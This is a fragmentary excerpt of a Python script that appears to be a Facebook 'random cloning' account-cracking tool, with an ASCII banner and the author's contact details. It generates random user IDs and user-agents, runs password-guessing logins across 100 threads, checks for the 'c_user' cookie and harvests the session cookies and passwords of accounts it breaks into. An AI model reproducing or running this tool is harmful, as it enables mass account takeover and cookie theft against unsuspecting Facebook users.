...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system("espeak \"Wall come To Imran Boss World sir, Bangladesh Random Cloning Start Please Wait\"")
logo=("""
\t\033[38;5;46m║█
                                                                                                     
`7MMF'`7MMM.     ,MMF'`7MM"""Mq.        db      `7MN.   `7MF'                                        
  MM    MMMb    dPMM    MM   `MM.      ;MM:       MMN.    M                                          
  MM    M YM   ,M MM    MM   ,M9      ,V^MM.      M YMb   M               ,AM   ,pP""Yq.       ,AM   
  MM    M  Mb  M' MM    MMmmdM9      ,M  `MM      M  `MN. M              AVMM  6W'    `Wb     AVMM   
  MM    M  YM.P'  MM    MM  YM.      AbmmmqMA     M   `MM.M      mmmmm ,W' MM  8M      M8   ,W' MM   
  MM    M  `YM'   MM    MM   `Mb.   A'     VML    M     YMM          ,W'   MM  YA.    ,A9 ,W'   MM   
.JMML..JML. `'  .JMML..JMML. .JMM..AMA.   .AMMA..JML.    YM          AmmmmmMMmm `Ybmmd9'  AmmmmmMMmm 
                                                                           MM                   MM
                                                                           MM                   MM
\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mıllıllı⭐🌟 M͙e͙h͙e͙d͙i͙ 🌟⭐ıllıllı\33[38;5;196m━━━━━━━━━
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]𝙄MRAN\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]𝙈𝘿 𝙄MRAN HOSSAIN\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : [★] 𝙈𝙧-IMRAN-404\33[38;5;196m       ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m        ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+601137587767\33[38;5;196m     ┃
...
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/Bowdir.bra.mayai.pore.geci.oky?mibextid=ZbWKwL )
    print(logo)
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as imran:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ...
        for guru in user:
          ...
          imran.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Imran-CP💔] {uid} • {ps}")
